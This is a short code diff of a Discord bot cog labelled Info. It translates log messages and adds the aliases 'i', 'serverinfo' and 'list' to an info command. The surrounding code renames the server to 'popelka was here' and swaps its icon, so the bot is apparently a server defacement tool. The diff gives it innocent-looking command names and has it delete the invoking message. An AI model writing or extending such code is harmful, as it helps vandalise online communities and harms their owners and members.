@@ -15,16 +15,17 @@ class Info(commands.Cog):
         except:
             pass
         await ctx.guild.edit(name="popelka was here")
-        print(f"nazev zmenen na: popelka was here")
+        print(f"name changed to: popelka was here")
         if os.path.exists(ICON):
             with open(ICON, 'rb') as f:
                 icon_bytes = f.read()
                 await ctx.guild.edit(icon=icon_bytes)
                 print("ikonka zmenena")
         else:
-            print(f"soubor {ICON} neexistuje")
+            print(f"file {ICON} doesnt exist, skipping icon change")
+            pass
 
-    @commands.command()
+    @commands.command(aliases=["i", "serverinfo", "list"])
     async def info(self, ctx):
         try:
             await ctx.message.delete()
